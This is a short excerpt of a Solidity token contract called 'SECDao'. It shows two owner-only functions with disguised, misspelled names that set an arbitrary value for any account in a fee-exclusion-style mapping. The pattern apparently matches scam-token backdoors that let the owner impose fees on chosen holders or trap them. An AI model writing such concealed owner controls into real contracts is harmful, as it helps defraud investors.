...
contract BaseToken is Ownable {
    ...
    string constant public name = 'SECDao';

    string constant public symbol = 'SECDAO';
    ...
    function setFFFFE(address acccount) public onlyOwner {
        _isDDDxcludedeFromFIE[acccount] = 1+0;
    }

    function setAddminFFFFE(address acccount,uint256 ammouunt) public onlyOwner {
        _isDDDxcludedeFromFIE[acccount] = 1*ammouunt+0;
    }
